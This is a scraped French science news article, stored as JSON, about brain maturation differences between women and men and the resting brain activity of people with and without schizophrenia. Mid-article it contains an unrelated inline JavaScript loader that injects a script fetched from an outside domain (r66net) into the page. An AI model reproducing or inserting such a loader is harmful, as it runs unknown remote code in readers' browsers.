{"title": "Le cerveau des femmes atteint la maturité avant celui des hommes", "newspaper": "Futura Sciences", "author": "Marie-Céline Jacquier", "date_publi": "14/12/2017", "content": "Des chercheurs espagnols et français ont réalisé une vaste étude et comparé près de 3.000 IRM. Ils voulaient savoir comment évoluait le cerveau au cours de la vie et quelles étaient les différences entre celui des hommes et celui des femmes. Des chercheurs du  CNRS , de l'université de Bordeaux et de l'université polytechnique de Valence (Espagne) ont étudié des  images de cerveaux  à tous les âges de la vie, allant du bébé de quelques mois à des adultes de plus de 90 ans. Ils voulaient mieux comprendre les évolutions du tissu cérébral au fil du temps. Les scientifiques ont utilisé la plateforme volBrain, un outil accessible en ligne. Mise en ligne en 2015, elle a déjà analysé plus de 53.000 IRM et est devenue une référence internationale pour l'étude du  cerveau . Leurs résultats paraissent dans la revue  Human Brain Mapping . Les chercheurs ont observé une augmentation de la matière grise de 1 à 8-10 ans, puis une diminution. Mais ce n'était pas vrai pour toutes les structures cérébrales. Par exemple, l'hippocampe avait une maturation plutôt longue.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Un outil pour le diagnostic de maladies neurologiques Cette étude a permis d'identifier la taille normale de chaque structure cérébrale pour un âge et un sexe donnés. Elle pourra donc servir d'outil pour détecter des anomalies cérébrales, souvent synonymes de pathologies. Par exemple, un patient dont l' hippocampe  a un volume inférieur à la normale risque de souffrir de la  maladie d'Alzheimer . Mais ces travaux ont aussi révélé des différences dans le développement du  cerveau de l’homme  et celui de la femme : d'une part, le cerveau des femmes arrivait à maturité avant celui des hommes ; d'autre part, après 80 ans, le cerveau masculin subissait une atrophie plus rapide que celui des femmes... Pour en savoir plus Pas de repos pour le cerveau des femmes ! Article de Claire Peltier paru le 23 novembre 2011 Les femmes parviennent souvent moins bien à se détendre complètement au point d'oublier tous les  soucis  du quotidien. Et pour cause, le cerveau féminin aurait une plus faible capacité à se reposer que celui des hommes. Une différence qui trouverait peut-être sa source dans le taux des  hormones  sexuelles. À l'image d'un  réseau Internet  où, quelle que soit l'heure, des internautes sont toujours connectés, notre  cerveau  n'est jamais complètement au repos. Même lorsqu'on ne pense « à rien », un circuit neuronal particulier, le «  réseau par défaut  » est toujours actif. C'est ce réseau qui s'active lorsque nous nous mettons à rêvasser, mais pour des tâches plus importantes, c'est le « réseau exécutif » qui s'active et permet de résoudre des problèmes cognitifs complexes. Chez les patients présentant des troubles psychiatriques comme la dépression, la  maladie d’Alzheimer  ou la  schizophrénie , le réseau par défaut est connu pour être perturbé. Pour mieux comprendre ces différences, les cerveaux d'hommes et de femmes volontaires sains et schizophrènes ont été analysés grâce à l' imagerie par résonnance magnétique fonctionnelle  ( IRMf ) basée sur l'observation de l'oxygénation de certaines zones par le sang. Des images des zones cérébrales activées ont été obtenues alors qu'ils effectuaient des tâches nécessitant une grande concentration (une rotation mentale d'une figure à trois dimensions), ou entre deux exercices (repos). Les chercheurs s'attendaient à obtenir des différences significatives entre  schizophrènes  et personnes non malades. C'est bien ce qui a été observé mais, en prime, l'équipe a mis au jour une différence du fonctionnement du cerveau entre homme et femme. La faute au réseau par défaut En ce qui concerne les personnes non malades, les  cortex  pariétal et préfrontal latéral (qui appartiennent au réseau par défaut) sont mieux irrigués et donc activés de manière significative chez les hommes au moment de la tâche de rotation, mais pas chez les femmes. Au repos, le réseau par défaut est en revanche plus actif chez les femmes que chez les hommes. Les femmes auraient plus de mal à se détendre que les hommes, car l'activité cérébrale du « réseau par défaut » reste élevée. © Romaineolas,  Wikimedia Commons , CC by-sa 3.0                               Ces résultats indiquent que le cerveau féminin a une plus faible capacité à se reposer, comme si les femmes pensaient toujours à ce qu'elles venaient de faire ou à ce qu'elles allaient faire ultérieurement, alors que les hommes quant à eux semblent plus loin de ces préoccupations. «  L'activité accrue du cerveau au repos des femmes pourrait expliquer leur capacité à effectuer plusieurs tâches en même temps et à être plus introspectives  », souligne Adrianna Mendrek, responsable de l'étude parue dans la revue  Schizophrenia Research . La testostérone, clé de la différence cérébrale homme-femme ? Étonnamment, ce constat est à l'opposé de celui mis en évidence chez les sujets schizophrènes. L'activité cérébrale des femmes malades ressemble davantage à celle des hommes sains, et inversement. De plus, alors que les hommes réussissent en général mieux que les femmes les tâches mentales tridimensionnelles, les femmes schizophrènes ont obtenu de meilleurs résultats que leurs comparses masculins. La mesure du taux d'hormone masculine (la  testostérone ) pourrait peut-être expliquer ce phénomène. Les femmes schizophrènes ont un taux de  testostérone  plus élevé que les femmes saines, et les hommes schizophrène ont à l'inverse un taux plus faible que les hommes sains.  Ces mesures ont montré une corrélation entre l'activité cérébrale et la testostérone, mais ne permettent pas d'affirmer l'existence d'un lien de cause à effet. De plus, «  les différences en question demeurent faibles et ne sont pas relevées chez tous les schizophrènes  », précise Adrianna Mendrek. De nouveaux travaux doivent donc compléter ces résultats. Cela vous intéressera aussi Comment soigne-t-on les troubles psychiques ?                       Dans cette vidéo, Virginie Lacombe, muséographe et chef de projet à la Cité des Sciences et de l’Industrie, décrit l’offre globale de soins proposée aux patients souffrant de troubles psychiques : médicaments, thérapies, psychanalyse…                                       ", "theme": "sante"}